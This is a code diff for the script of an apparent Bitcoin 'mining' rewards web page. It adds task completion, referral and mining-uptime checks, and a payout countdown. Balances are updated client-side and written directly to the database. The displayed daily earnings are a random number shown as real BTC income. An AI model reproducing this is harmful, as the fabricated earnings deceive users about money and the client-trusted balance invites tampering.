+          taskList.innerHTML = '<p style="text-align:center; opacity:0.7;">No tasks available at the moment</p>';
+        }
+      });
+    }
 
-    function completeTask() {
-      balance += 0.005;
-      userRef.update({ balance: balance.toFixed(5) });
+    function hasCompletedTask(taskId) {
+      return completedTasks.includes(taskId);
+    }
+
+    function completeTask(taskId, reward) {
+      if (hasCompletedTask(taskId)) {
+        showNotification('You already completed this task', 'warning');
+        return;
+      }
+      
+      // Special handling for refer friend task
+      if (taskId === 'refer_friend') {
+        userRef.once('value').then(snap => {
+          const userData = snap.val();
+          if ((userData.referrals || 0) < 1) {
+            showNotification('You need to refer at least 1 friend to complete this task', 'error');
+            return;
+          }
+          
+          actuallyCompleteTask(taskId, reward);
+        });
+      } else if (taskId === 'daily_bonus') {
+        userRef.once('value').then(snap => {
+          const userData = snap.val();
+          if ((userData.mining_uptime || 0) < 3600) { // 1 hour
+            showNotification('You need to mine for at least 1 hour today', 'error');
+            return;
+          }
+          
+          actuallyCompleteTask(taskId, reward);
+        });
+      } else {
+        actuallyCompleteTask(taskId, reward);
+      }
+    }
+
+    function actuallyCompleteTask(taskId, reward) {
+      balance += reward;
+      completedTasks.push(taskId);
+      
+      userRef.update({
+        balance: balance.toFixed(8),
+        completed_tasks: completedTasks
+      });
+      
       updateBalance();
-      showNotification('Task completed! +0.005 BTC');
+      loadTasks();
+      showNotification(`Task completed! +${reward.toFixed(3)} BTC`, 'success');
+    }
+
+    function getReferredBy() {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get('ref');
     }
 
     // Initialize
+    loadTasks();
     updateStats();
+    
+    // Countdown timer for next payout
     setInterval(() => {
       const now = new Date();
       const nextHour = new Date();
@@ -610,6 +1170,14 @@
       document.getElementById('nextPayout').textContent = 
         `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
     }, 1000);
+    
+    // Initial uptime display
+    const initialHours = Math.floor(totalUptime / 3600);
+    const initialMinutes = Math.floor((totalUptime % 3600) / 60);
+    document.getElementById('uptime').textContent = `${initialHours}h ${initialMinutes}m`;
+    
+    // Set daily earnings (random between 0.0001 and 0.0005)
+    document.getElementById('dailyEarnings').textContent = (0.0001 + Math.random() * 0.0004).toFixed(5) + ' BTC';
   </script>
 </body>
 </html>
